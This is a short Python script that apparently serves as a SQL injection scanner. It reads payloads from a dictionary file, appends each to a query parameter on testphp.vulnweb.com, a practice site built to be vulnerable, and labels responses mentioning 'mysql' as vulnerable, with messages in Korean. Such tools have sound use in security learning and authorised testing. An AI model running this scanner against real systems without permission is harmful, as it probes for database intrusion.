import requests

url = 'http://testphp.vulnweb.com/listproducts.php?cat='

sqli_payloads = []

with open('sqli_dic.txt','r') as file_dic:
    for line in file_dic:
        sqli_payload = line[:-1]
        sqli_payloads.append(sqli_payload)

for payload in sqli_payloads:
    print('진단 : '+url+payload)
    response = requests.post(url+payload)
    if'mysql'in response.text.lower():
        print('취약점 발견, 문자열 '+payload)
    else:
        print('취약점 없음, 문자열 '+payload)
